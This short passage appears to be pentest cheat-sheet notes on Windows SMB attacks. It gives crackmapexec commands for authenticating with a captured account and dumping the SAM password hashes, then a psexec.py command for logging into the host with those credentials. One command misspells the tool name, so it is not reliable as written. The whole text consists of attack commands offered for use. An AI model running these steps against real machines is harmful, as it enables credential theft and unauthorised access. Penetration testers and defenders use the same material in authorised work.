
### Usage
```sh
crackmapexec smb <ip_address> -u <user_name> -d <domain_name> -p <password>
```

Once we pwn an account we can be able to dump the SAM to an external file as shown below
```sh
crackmapexcec smb <ip_address> -u <user_name> -d <domain_name> -p <password> --sam
```


We can then login using psexec as shown below

```sh
psexec.py <domain_name>/<user_name>:<password>@<ip_address>
```
